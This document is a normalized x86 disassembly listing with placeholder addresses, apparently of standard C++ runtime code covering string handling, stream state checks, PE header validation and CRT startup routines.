push 0xffffffff
push sub_42abc8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x18
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x0
lea ecx [ ebp - 0x18 ]
call sub_40e578
mov [ ebp - 0x4 ] 0x0
mov edi [ rw-data ]
mov ebx [ rw-data ]
mov [ ebp - 0x10 ] ebx
test edi edi
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x4 ]
cmp edi [ ecx + 0xc ]
jae r-xdata
push edi
lea ecx [ ebp - 0x14 ]
call sub_40e578
cmp [ rw-data ] edi
jne r-xdata
xor esi esi
mov eax [ ecx + 0x8 ]
mov esi [ eax + edi * 4 ]
test esi esi
jne r-xdata
lea ecx [ ebp - 0x14 ]
call sub_40e5d0
mov edi [ rw-data ]
mov eax [ rw-data ]
inc eax
mov [ rw-data ] eax
mov [ rw-data ] eax
test esi esi
jne r-xdata
call sub_40e7b7
cmp edi [ eax + 0xc ]
jae r-xdata
lea ecx [ ebp - 0x18 ]
call sub_40e5d0
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp r-xdata
test ebx ebx
je r-xdata
mov eax [ eax + 0x8 ]
mov esi [ eax + edi * 4 ]
cmp [ ecx + 0x14 ] 0x0
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_40cbe0
add esp 0x8
cmp eax 0xffffffff
jne r-xdata
mov esi ebx
jmp r-xdata
mov esi [ ebp - 0x10 ]
mov ecx esi
mov [ rw-data ] esi
mov edx [ esi ]
call [ edx + 0x4 ]
push esi
call sub_40e789
add esp 0x4
xorps xmm0 xmm0
mov [ ebp - 0x24 ] r--data
push r--data
lea eax [ ebp - 0x24 ]
movq [ ebp - 0x20 ] xmm0
push eax
mov [ ebp - 0x20 ] r--data
call sub_4111b8
sub_40cba0
push ebp
mov ebp esp
push esi
mov esi ecx
xorps xmm0 xmm0
lea eax [ esi + 0x4 ]
push eax
mov [ esi ] r--data
movq [ eax ] xmm0
mov eax [ ebp + 0x8 ]
add eax 0x4
push eax
call sub_4109ad
add esp 0x8
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_40cbe0
push ebp
mov ebp esp
push 0xffffffff
push sub_42abff
mov eax [ fs : 0x0 ]
push eax
sub esp 0x38
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x10 ] 0x0
test esi esi
je r-xdata
mov eax 0x2
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
cmp [ esi ] 0x0
jne r-xdata
push 0x8
call sub_40d5ac
mov edi eax
add esp 0x4
mov [ ebp + 0x8 ] edi
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0x0
mov eax [ ecx + 0x4 ]
test eax eax
jne r-xdata
mov ecx [ eax + 0x18 ]
test ecx ecx
jne r-xdata
mov ecx r--data
jmp r-xdata
push ecx
lea ecx [ ebp - 0x44 ]
call sub_4078f0
mov [ edi + 0x4 ] 0x0
lea ecx [ ebp - 0x44 ]
mov [ edi ] r--data
mov [ esi ] edi
call sub_4079d0
lea ecx [ eax + 0x1c ]
sub_40cc90
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ esi + 0x14 ]
cmp ecx 0x10
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov edx [ esi + 0x10 ]
or eax 0xffffffff
push ebx
mov ebx [ ebp + 0x10 ]
sub eax edx
push edi
cmp eax ebx
jbe r-xdata
cmp ecx 0x10
jb r-xdata
cmp eax r--data
ja r-xdata
push r--data
call sub_40e50b
lea edi [ edx + ebx ]
test ebx ebx
je r-xdata
mov edx esi
mov edx [ esi ]
jmp r-xdata
pop edi
pop ebx
mov eax esi
pop esi
pop ebp
retn 0xc
cmp edi 0xfffffffe
ja r-xdata
cmp ecx 0x10
jb r-xdata
mov eax [ esi + 0x10 ]
add eax edx
cmp eax r--data
jbe r-xdata
push r--data
call sub_40e50b
cmp ecx edi
jae r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
test edi edi
jne r-xdata
push edx
push edi
mov ecx esi
call sub_4070d0
test edi edi
je r-xdata
push [ ebp + 0x10 ]
mov eax r--data
sub eax ecx
push eax
push esi
push ecx
mov ecx esi
call sub_40cde0
pop esi
pop ebp
retn 0xc
mov eax [ esi + 0x14 ]
cmp eax 0x10
jb r-xdata
mov [ esi + 0x10 ] edi
cmp ecx 0x10
jb r-xdata
mov edx esi
mov edx [ esi ]
jmp r-xdata
mov eax esi
pop edi
pop ebx
pop esi
mov [ eax ] 0x0
pop ebp
retn 0xc
mov eax [ esi ]
pop edi
pop ebx
mov [ eax ] 0x0
mov eax esi
pop esi
pop ebp
retn 0xc
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp eax 0x10
jb r-xdata
cmp [ esi + 0x14 ] 0x10
jb r-xdata
push ecx
push edx
add eax ebx
push eax
call sub_410380
add esp 0xc
mov ecx [ esi + 0x10 ]
test ecx ecx
je r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov [ esi + 0x10 ] edi
cmp [ esi + 0x14 ] 0x10
jb r-xdata
push ebx
push r--data
push eax
call sub_4117a0
add esp 0xc
test ebx ebx
je r-xdata
mov eax esi
mov [ eax + edi ] 0x0
mov eax [ esi ]
mov [ eax + edi ] 0x0
mov eax esi
pop edi
pop ebx
pop esi
pop ebp
retn 0xc
sub_40cde0
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push ebx
push esi
mov esi ecx
mov ecx [ ebp + 0x10 ]
mov eax [ eax + 0x10 ]
push edi
cmp eax ecx
jb r-xdata
push r--data
call sub_40e52b
mov edi [ ebp + 0x14 ]
sub eax ecx
mov ecx [ esi + 0x10 ]
cmp edi eax
cmova edi eax
or eax 0xffffffff
sub eax ecx
cmp eax edi
jbe r-xdata
push r--data
call sub_40e50b
lea ebx [ ecx + edi ]
test edi edi
je r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x10
cmp ebx 0xfffffffe
ja r-xdata
push r--data
call sub_40e50b
cmp [ esi + 0x14 ] ebx
jae r-xdata
test ebx ebx
jne r-xdata
push ecx
push ebx
mov ecx esi
call sub_4070d0
test ebx ebx
je r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0x10
jb r-xdata
mov [ esi + 0x10 ] ebx
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov edx esi
mov edx [ esi ]
jmp r-xdata
mov eax esi
pop edi
pop esi
pop ebx
mov [ eax ] 0x0
pop ebp
retn 0x10
mov eax [ esi ]
pop edi
mov [ eax ] bl
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x10
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp eax 0x10
jb r-xdata
mov eax [ ebp + 0xc ]
cmp esi eax
jne r-xdata
push ecx
push edx
add eax edi
push eax
call sub_410380
add esp 0xc
mov ecx [ esi + 0x10 ]
test ecx ecx
je r-xdata
cmp [ eax + 0x14 ] 0x10
jb r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov eax [ eax ]
mov ecx [ esi + 0x14 ]
cmp ecx 0x10
jb r-xdata
add eax edi
mov edx esi
mov edx [ esi ]
jmp r-xdata
mov edx esi
mov edx [ esi ]
jmp r-xdata
mov [ esi + 0x10 ] ebx
cmp [ esi + 0x14 ] 0x10
jb r-xdata
add eax [ ebp + 0x10 ]
push edi
push eax
push edx
call sub_4117a0
test edi edi
je r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
cmp ecx 0x10
jb r-xdata
mov eax esi
mov [ eax + ebx ] 0x0
mov eax [ esi ]
pop edi
mov [ eax + ebx ] 0x0
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x10
push edi
add eax edx
push eax
push ecx
call sub_410380
jmp r-xdata
test edi edi
je r-xdata
add esp 0xc
sub_40cf40
push ebp
mov ebp esp
push 0xffffffff
push sub_42ac36
mov eax [ fs : 0x0 ]
push eax
sub esp 0x20
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi edx
mov [ ebp - 0x20 ] esi
mov ebx ecx
mov [ ebp - 0x18 ] ebx
xor al al
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x11 ] al
xor edi edi
mov eax [ ebx ]
mov [ ebp - 0x24 ] edi
mov eax [ eax + 0x4 ]
mov ecx [ eax + ebx + 0x38 ]
test ecx ecx
je r-xdata
push ecx
mov ecx ebx
mov [ ebp - 0x4 ] 0x0
call sub_40d2f0
mov [ ebp - 0x28 ] al
mov [ ebp - 0x4 ] 0x1
test al al
je r-xdata
mov eax [ ecx ]
call [ eax + 0x4 ]
or edi 0x2
mov [ ebp - 0x4 ] 0x2
mov [ esi + 0x10 ] 0x0
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov [ ebp - 0x4 ] 0x4
mov ecx [ ebp - 0x2c ]
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
mov ecx [ eax + ecx + 0x38 ]
test ecx ecx
je r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax ebx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ecx ]
call [ eax + 0x8 ]
push 0x0
push eax
call sub_4082b0
or eax 0x4
mov eax [ ecx ]
call [ eax + 0x18 ]
mov ecx eax
nop [ eax ] eax
mov eax [ ecx + 0x2c ]
cmp [ eax ] 0x0
jle r-xdata
mov [ eax ] 0x0
movzx eax [ ebp + 0x8 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebx ]
mov eax [ eax + 0x4 ]
mov ecx [ eax + ebx + 0x38 ]
mov eax [ ecx + 0x1c ]
mov edx [ eax ]
test edx edx
je r-xdata
cmp ecx [ ebp - 0x1c ]
sete al
test al al
je r-xdata
or edi 0x1
jmp r-xdata
movzx ecx [ edx ]
jmp r-xdata
cmp [ esi + 0x10 ] 0xfffffffe
jb r-xdata
mov eax [ ebx ]
mov [ ebp - 0x11 ] 0x1
mov eax [ eax + 0x4 ]
mov ecx [ eax + ebx + 0x38 ]
mov eax [ ecx + 0x1c ]
cmp [ eax ] 0x0
je r-xdata
mov al [ ebp - 0x11 ]
mov [ ebp - 0x4 ] 0x1
test al al
jne r-xdata
cmp ecx 0xffffffff
sete al
test al al
je r-xdata
push ecx
mov ecx esi
call sub_40d240
mov eax [ ebx ]
mov [ ebp - 0x11 ] 0x1
mov eax [ eax + 0x4 ]
mov esi [ eax + ebx + 0x38 ]
mov eax [ esi + 0x1c ]
mov eax [ eax ]
test eax eax
je r-xdata
or edi 0x2
jmp r-xdata
mov eax [ ecx ]
call [ eax + 0x1c ]
jmp r-xdata
mov edx [ ecx + 0x2c ]
mov eax [ edx ]
test eax eax
jle r-xdata
mov eax [ ebx ]
mov ecx [ eax + 0x4 ]
add ecx ebx
test edi edi
je r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0x1c ]
mov ecx [ esi + 0x2c ]
mov edx [ ecx ]
cmp edx 0x1
jle r-xdata
dec eax
mov [ edx ] eax
mov eax [ ecx + 0x1c ]
inc [ eax ]
jmp r-xdata
mov eax [ esi + 0x1c ]
mov ecx [ eax ]
test ecx ecx
je r-xdata
mov esi [ ebp - 0x20 ]
or ecx 0xffffffff
jmp r-xdata
test eax eax
je r-xdata
lea eax [ edx - 0x1 ]
mov [ ecx ] eax
mov eax [ esi + 0x1c ]
mov esi [ ebp - 0x20 ]
mov ecx [ eax ]
inc ecx
mov [ eax ] ecx
movzx ecx [ ecx ]
jmp r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0x18 ]
mov esi [ ebp - 0x20 ]
mov ecx eax
jmp r-xdata
mov eax [ esi + 0x2c ]
cmp [ eax ] 0x0
jle r-xdata
mov ecx [ esi + 0x2c ]
mov eax [ ecx ]
test eax eax
jle r-xdata
movzx ecx [ ecx ]
mov esi [ ebp - 0x20 ]
jmp r-xdata
dec eax
mov [ ecx ] eax
mov ecx [ esi + 0x1c ]
mov edx [ ecx ]
lea eax [ edx + 0x1 ]
mov [ ecx ] eax
movzx eax [ edx ]
jmp r-xdata
cmp eax 0xffffffff
sete al
test al al
je r-xdata
sub_40d107
mov ecx [ ebp - 0x18 ]
mov eax [ ecx ]
mov edx [ eax + 0x4 ]
mov eax [ edx + ecx + 0xc ]
add edx ecx
or eax 0x4
cmp [ edx + 0x38 ] 0x0
jne r-xdata
push 0x1
push eax
mov ecx edx
call sub_4082b0
mov eax r-xdata
retn
or eax 0x4
sub_40d1a0
push ebp
mov ebp esp
push 0xffffffff
push sub_42aa06
mov eax [ fs : 0x0 ]
push eax
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x4 ] 0x0
mov ecx [ ecx ]
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
mov ecx [ eax + ecx + 0x38 ]
test ecx ecx
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn
mov eax [ ecx ]
call [ eax + 0x8 ]
sub_40d1f0
push ebp
mov ebp esp
push 0xffffffff
push sub_42a580
mov eax [ fs : 0x0 ]
push eax
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ecx [ ecx ]
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
mov ecx [ eax + ecx + 0x38 ]
test ecx ecx
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn
mov eax [ ecx ]
call [ eax + 0x8 ]
sub_40d240
push ebp
mov ebp esp
push esi
mov esi ecx
or eax 0xffffffff
push edi
mov ecx [ esi + 0x10 ]
sub eax ecx
cmp eax 0x1
jbe r-xdata
push r--data
call sub_40e50b
lea edi [ ecx + 0x1 ]
cmp edi 0xfffffffe
ja r-xdata
push r--data
call sub_40e50b
cmp [ esi + 0x14 ] edi
jae r-xdata
test edi edi
jne r-xdata
push ecx
push edi
mov ecx esi
call sub_4070d0
test edi edi
je r-xdata
cmp [ esi + 0x14 ] 0x10
mov edx [ esi + 0x10 ]
jb r-xdata
mov [ esi + 0x10 ] edi
cmp [ esi + 0x14 ] 0x10
jb r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0x4
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov eax esi
pop edi
pop esi
mov [ eax ] 0x0
pop ebp
retn 0x4
mov eax [ esi ]
pop edi
mov [ eax ] 0x0
mov eax esi
pop esi
pop ebp
retn 0x4
mov eax esi
mov [ eax + edi ] 0x0
mov eax [ esi ]
mov [ eax + edi ] 0x0
mov eax esi
pop edi
pop esi
pop ebp
retn 0x4
mov al [ ebp + 0x8 ]
mov [ ecx + edx ] al
mov [ esi + 0x10 ] edi
cmp [ esi + 0x14 ] 0x10
jb r-xdata
sub_40d2f0
push ebp
mov ebp esp
push 0xffffffff
push sub_42ac60
mov eax [ fs : 0x0 ]
push eax
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
add ecx esi
cmp [ ecx + 0xc ] 0x0
jne r-xdata
mov eax [ ecx + 0xc ]
or eax 0x2
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov ecx [ ecx + 0x3c ]
test ecx ecx
je r-xdata
push 0x0
push eax
call sub_4082b0
xor al al
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
or eax 0x4
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
add ecx esi
cmp [ ecx + 0xc ] 0x0
jne r-xdata
call sub_40d380
nop
mov al 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_40d380
push ebp
mov ebp esp
push 0xffffffff
push sub_42ac9c
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov ecx [ eax + esi + 0x38 ]
test ecx ecx
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ecx ]
mov [ ebp - 0x14 ] esi
call [ eax + 0x4 ]
mov [ ebp - 0x4 ] 0x0
mov eax [ esi ]
mov eax [ eax + 0x4 ]
cmp [ eax + esi + 0xc ] 0x0
jne r-xdata
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
cmp [ ecx + esi + 0xc ] 0x0
sete al
mov [ ebp - 0x10 ] al
mov [ ebp - 0x4 ] 0x1
test al al
je r-xdata
mov ecx [ eax + esi + 0x3c ]
test ecx ecx
je r-xdata
mov [ ebp - 0x4 ] 0x2
call j_sub_410371
test al al
jne r-xdata
mov ecx [ ecx + esi + 0x38 ]
mov eax [ ecx ]
call [ eax + 0x34 ]
cmp eax 0xffffffff
jne r-xdata
cmp ecx esi
je r-xdata
mov [ ebp - 0x4 ] 0x3
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov ecx [ eax + esi + 0x38 ]
test ecx ecx
je r-xdata
mov ecx esi
call sub_40d4d0
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
mov eax [ ecx + esi + 0xc ]
add ecx esi
or eax 0x4
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
call sub_40d380
mov eax [ ecx ]
call [ eax + 0x8 ]
push 0x0
push eax
call sub_4082b0
or eax 0x4
sub_40d470
push ebp
mov ebp esp
push 0xffffffff
push sub_42a6a6
mov eax [ fs : 0x0 ]
push eax
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
call j_sub_410371
test al al
jne r-xdata
mov [ ebp - 0x4 ] 0x0
mov ecx [ esi ]
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
mov ecx [ eax + ecx + 0x38 ]
test ecx ecx
je r-xdata
mov ecx [ esi ]
call sub_40d4d0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ecx ]
call [ eax + 0x8 ]
sub_40d4d0
push ebp
mov ebp esp
push 0xffffffff
push sub_42acc0
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi ecx
mov [ ebp - 0x4 ] 0x0
mov eax [ esi ]
mov eax [ eax + 0x4 ]
cmp [ eax + esi + 0xc ] 0x0
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
test [ eax + esi + 0x14 ] 0x2
je r-xdata
mov ecx [ eax + esi + 0x38 ]
mov eax [ ecx ]
call [ eax + 0x34 ]
cmp eax 0xffffffff
jne r-xdata
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
mov eax [ ecx + esi + 0xc ]
add ecx esi
or eax 0x4
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
push 0x0
push eax
call sub_4082b0
or eax 0x4
sub_40d589
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push 0xc
push esi
call sub_40d57b
pop ecx
pop ecx
sub_40d5ac
push ebp
mov ebp esp
jmp r-xdata
push [ ebp + 0x8 ]
call sub_413b61
pop ecx
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call sub_416f7e
pop ecx
test eax eax
jne r-xdata
pop ebp
retn
cmp [ ebp + 0x8 ] 0xffffffff
jne r-xdata
call sub_40e4ee
call sub_40df52
sub_40d5e4
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov ecx [ eax + 0x3c ]
add ecx eax
movzx eax [ ecx + 0x14 ]
lea edx [ ecx + 0x18 ]
add edx eax
movzx eax [ ecx + 0x6 ]
imul esi eax 0x28
add esi edx
cmp edx esi
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
add edx 0x28
cmp edx esi
jne r-xdata
mov eax [ edx + 0x8 ]
add eax [ edx + 0xc ]
cmp ecx eax
jb r-xdata
cmp ecx [ edx + 0xc ]
jb r-xdata
mov eax edx
jmp r-xdata
pop esi
pop ebp
retn
sub_40d628
call sub_40e114
test eax eax
jne r-xdata
mov eax [ fs : 0x18 ]
push esi
mov esi rw-data
mov edx [ eax + 0x4 ]
jmp r-xdata
xor al al
retn
xor eax eax
mov ecx edx
[ esi ] ecx
test eax eax
jne r-xdata
cmp edx eax
je r-xdata
xor al al
pop esi
retn
mov al 0x1
pop esi
retn
sub_40d65d
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
call sub_40df6f
call sub_410a69
test al al
jne r-xdata
mov [ rw-data ] 0x1
call sub_417c54
test al al
jne r-xdata
xor al al
pop ebp
retn
mov al 0x1
pop ebp
retn
push 0x0
call sub_410a97
pop ecx
jmp r-xdata
sub_40d696
push ebp
mov ebp esp
sub esp 0xc
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_40e114
test eax eax
je r-xdata
cmp esi 0x1
jne r-xdata
mov eax [ rw-data ]
lea esi [ ebp - 0xc ]
push edi
and eax 0x1f
mov edi rw-data
push 0x20
pop ecx
sub ecx eax
or eax 0xffffffff
ror eax cl
xor eax [ rw-data ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi rw-data
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
lea esi [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
mov al 0x1
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
test esi esi
jne r-xdata
push 0x5
call sub_40e120
int3
push rw-data
call sub_417b02
pop ecx
test eax eax
je r-xdata
push rw-data
call sub_417b02
neg eax
pop ecx
sbb al al
inc al
jmp r-xdata
xor al al
jmp r-xdata
pop esi
mov esp ebp
pop ebp
retn
sub_40d72d
push 0x8
push r--data
call sub_40e2a0
and [ ebp - 0x4 ] 0x0
mov eax 0x5a4d
cmp [ __dos_header ] ax
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
xor al al
mov eax [ r--data ]
cmp [ eax + __dos_header ] 0x4550
jne r-xdata
mov ecx 0x10b
cmp [ eax + r--data ] cx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx __dos_header
sub eax ecx
push eax
push ecx
call sub_40d5e4
pop ecx
pop ecx
test eax eax
je r-xdata
test [ eax + 0x24 ] 0x80000000
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov al 0x1
jmp r-xdata
call sub_40e2e6
retn
sub_40d7d7
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
push [ ebp + 0x8 ]
call sub_417c66
push [ ebp + 0x8 ]
call sub_410a97
pop ecx
pop ecx
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov al 0x1
pop ebp
retn
sub_40d7ff
push ebp
mov ebp esp
mov eax [ rw-data ]
mov ecx eax
xor eax [ rw-data ]
and ecx 0x1f
push [ ebp + 0x8 ]
ror eax cl
cmp eax 0xffffffff
jne r-xdata
push rw-data
call sub_417b3f
pop ecx
call sub_417acf
jmp r-xdata
neg eax
pop ecx
sbb eax eax
not eax
and eax [ ebp + 0x8 ]
pop ebp
retn
sub_40d85d
push ebx
push esi
push edi
push 0x0
push 0xfa0
push rw-data
call sub_410f89
add esp 0xc
push r--data
call [ GetModuleHandleW@IAT ]
mov esi eax
test esi esi
je r-xdata
push 0x7
call sub_40e120
int3
push r--data
push esi
call [ GetProcAddress@IAT ]
push r--data
push esi
mov ebx eax
call [ GetProcAddress@IAT ]
push r--data
push esi
mov edi eax
call [ GetProcAddress@IAT ]
mov esi eax
test ebx ebx
je r-xdata
xor eax eax
push eax
push eax
push 0x1
push eax
call [ CreateEventW@IAT ]
mov [ rw-data ] eax
test eax eax
je r-xdata
test edi edi
je r-xdata
push sub_40d91d
call sub_40d83a
pop ecx
pop edi
pop esi
xor eax eax
pop ebx
retn
test esi esi
je r-xdata
and [ rw-data ] 0x0
mov ecx ebx
push rw-data
call j_sub_401f50
call ebx
push edi
call sub_410c5a
push esi
mov [ rw-data ] eax
call sub_410c5a
pop ecx
pop ecx
mov [ rw-data ] eax
jmp r-xdata
sub_40d939
push ebp
mov ebp esp
call sub_40d9be
mov ecx [ rw-data ]
mov eax [ ebp + 0x8 ]
inc ecx
mov [ rw-data ] ecx
mov [ eax ] ecx
mov eax [ fs : 0x2c ]
mov ecx [ rw-data ]
mov ecx [ eax + ecx * 4 ]
mov eax [ rw-data ]
mov [ ecx + 0x4 ] eax
call sub_40da0b
pop ebp
jmp sub_40d9ca
sub_40d978
push ebp
mov ebp esp
push esi
call sub_40d9be
mov esi [ ebp + 0x8 ]
jmp r-xdata
cmp [ esi ] 0x0
je r-xdata
or [ esi ] 0xffffffff
cmp [ esi ] 0xffffffff
je r-xdata
push 0x64
call sub_40da17
pop ecx
mov eax [ fs : 0x2c ]
mov ecx [ rw-data ]
mov ecx [ eax + ecx * 4 ]
mov eax [ rw-data ]
mov [ ecx + 0x4 ] eax
jmp r-xdata
pop esi
pop ebp
jmp sub_40da0b
sub_40d9ca
mov eax [ rw-data ]
test eax eax
jne r-xdata
push eax
call [ SetEvent@IAT ]
push [ rw-data ]
call [ ResetEvent@IAT ]
retn
push esi
mov esi [ rw-data ]
mov ecx esi
xor esi [ rw-data ]
and ecx 0x1f
ror esi cl
push rw-data
mov ecx esi
call j_sub_401f50
call esi
pop esi
retn
sub_40da17
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
push esi
jne r-xdata
call sub_40da0b
push 0x0
push [ ebp + 0x8 ]
push [ rw-data ]
call [ WaitForSingleObjectEx@IAT ]
mov esi eax
call sub_40d9be
xor eax eax
test esi esi
sete al
mov esi [ rw-data ]
mov ecx esi
push [ ebp + 0x8 ]
xor esi [ rw-data ]
and ecx 0x1f
ror esi cl
push rw-data
push rw-data
mov ecx esi
call j_sub_401f50
call esi
neg eax
sbb eax eax
neg eax
jmp r-xdata
pop esi
pop ebp
retn
sub_40da7c
push esi
push 0x1
call sub_417c7e
call sub_40e397
push eax
call sub_417e04
call sub_4190e1
mov esi eax
call sub_40a920
push 0x1
mov [ esi ] eax
call sub_40d696
add esp 0xc
pop esi
test al al
je r-xdata
push 0x7
call sub_40e120
int3
fnclex
call sub_40e405
push sub_40e430
call sub_40d83a
call sub_40e110
push eax
call sub_417481
pop ecx
pop ecx
test eax eax
jne r-xdata
call sub_40e39d
call sub_40e3ed
test eax eax
je r-xdata
call sub_401f50
call sub_401f50
call sub_40e3a9
call sub_40a920
push eax
call sub_418399
pop ecx
call sub_40af40
test al al
je r-xdata
push sub_40a920
call sub_417d22
pop ecx
call sub_40a920
xor eax eax
retn
call j_sub_4174bb
sub_40db3a
push 0x14
push r--data
call sub_40e2a0
push 0x1
call sub_40d65d
pop ecx
test al al
jne r-xdata
xor bl bl
mov [ ebp - 0x19 ] bl
and [ ebp - 0x4 ] 0x0
call sub_40d628
mov [ ebp - 0x24 ] al
mov eax [ rw-data ]
xor ecx ecx
inc ecx
cmp eax ecx
je r-xdata
push 0x7
call sub_40e120
test eax eax
jne r-xdata
mov bl cl
mov [ ebp - 0x19 ] bl
mov [ rw-data ] ecx
push r--data
push r--data
call sub_417d93
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_40e3ff
mov esi eax
cmp [ esi ] edi
je r-xdata
push esi
call sub_40d72d
pop ecx
test al al
je r-xdata
push r--data
push r--data
call sub_417d37
pop ecx
pop ecx
mov [ rw-data ] 0x2
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax 0xff
jmp r-xdata
push edi
call sub_411061
call sub_417f31
mov edi eax
call sub_417f2b
mov esi eax
call sub_417763
push eax
push [ edi ]
push [ esi ]
call sub_402380
push esi
call sub_40d72d
pop ecx
test al al
je r-xdata
push edi
push 0x2
push edi
mov esi [ esi ]
mov ecx esi
call j_sub_401f50
call esi
push [ ebp - 0x24 ]
call sub_40d7ba
pop ecx
call sub_40e3f9
mov esi eax
xor edi edi
cmp [ esi ] edi
je r-xdata
call sub_40e2e6
retn
push [ esi ]
call sub_4151d2
pop ecx
sub_40dc87
